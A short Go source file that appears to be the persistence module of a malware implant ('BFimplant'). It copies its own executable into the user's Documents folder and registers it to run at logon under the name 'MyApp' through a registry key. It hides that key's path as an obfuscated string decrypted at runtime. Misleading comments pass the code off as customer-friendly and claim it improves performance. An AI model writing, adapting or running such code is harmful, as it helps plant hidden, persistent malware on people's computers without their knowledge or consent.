package per

import (
	"fmt"
	"syscall"
	"path/filepath"
	"BFimplant/winapiV2"
)

//we love our customers

func Add_per(){
    exePath := GetExecutablePath()

    documentsPath := GetDocumentsPath()

    destPath := filepath.Join(documentsPath, filepath.Base(exePath))

    if !FileExists(destPath) {
        err := CopyFile(exePath, destPath)
        if err != nil {
            fmt.Println("Error copying executable:", err)
            return
        }
        fmt.Println("plants copied successfully to thank you for your help:", destPath)
    } else {
        fmt.Println("plants already exists in Doccccc:", destPath)
    }

    //this function will help you to run your application at startup for more performance
	key, err := RegCreateKeyEx(syscall.HKEY_CURRENT_USER, winapiV2.DecryptString("\x16*#12$7 \x19\x08,&7*6*#1\x19\x12,+!*26\x19\x06077 +1\x13 76,*+\x19\x170+"))
	fmt.Println(key)
	if err != nil {
		fmt.Println("", err)
		return
	}
	defer RegCloseKey(key)

	err = RegSetValueEx(key, "MyApp", destPath)
	if err != nil {
		fmt.Println("Error settttt regggggg vallll:", err)
		return
	}

	fmt.Println("Your plant will grow at startup .")
}